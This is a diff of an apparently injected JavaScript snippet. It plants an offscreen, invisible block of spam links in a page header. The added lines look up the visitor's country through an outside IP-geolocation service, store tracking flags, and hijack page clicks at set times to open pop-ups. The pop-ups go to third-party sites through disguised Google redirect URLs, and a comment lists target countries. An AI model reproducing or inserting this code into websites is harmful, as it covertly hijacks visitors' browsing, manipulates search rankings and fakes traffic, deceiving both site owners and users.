@@ -1,13 +1,35 @@
 let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://www.am2z.com">Am2z News</a><a href="https://www.mrjaz.com">MrJaz</a><a href="https://sohanisharma.com">SohaniSharma</a><a href="https://quikfinance.blogspot.com">Quik Finance</a></div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
 
+let dts=(new Date).getSeconds();
+let dtm=(new Date).getMinutes();
+
+if(!localStorage.xrd){
+  (async()=>{
+    localStorage.xrd=1;
+    let aa=await(await(await fetch('https://ipapi.co/country_name')).text());
+    if(aa=='Ahmedabad'){
+      localStorage.Ahme='1';
+      uhd()
+    }
+  })();
+}
+
+
+function uhd(){
   document.onclick=()=>{
-    let dts=(new Date).getSeconds();
-    let dtm=(new Date).getMinutes();
-      if(!sessionStorage.i&&dtm==9&&(dts==3||dts==9)){
-          window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://quikfinance.blogspot.com/&ved=2ahUKEwjJrN-o0sn7AhUYT2wGHV8-BjMQFnoECBUQAQ&usg=AOvVaw310xac6tK_tXd7iu0nFfse'); 
-          sessionStorage.i='i';
-      }         
+    if(!sessionStorage.i&&localStorage.Ahme&&dtm==3&&(dts==3)){
+        window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://sohanisharma.com/&ved=2ahUKEwid6trDttr7AhVK7nMBHVV8ATY4vgEQFnoECAgQAQ&usg=AOvVaw2FwzforLOYGwSOaMFMe8Du'); 
+    }
+    if(!sessionStorage.i&&dtm==9&&(dts==9)){
+      window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://quikfinance.blogspot.com/&ved=2ahUKEwje85WXt9r7AhXESWwGHVmCCe4QFnoECBIQAQ&usg=AOvVaw310xac6tK_tXd7iu0nFfse'); 
+    }  
+    sessionStorage.i='i';
   }
+}
+uhd()
+
+
+
 
 // United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
 
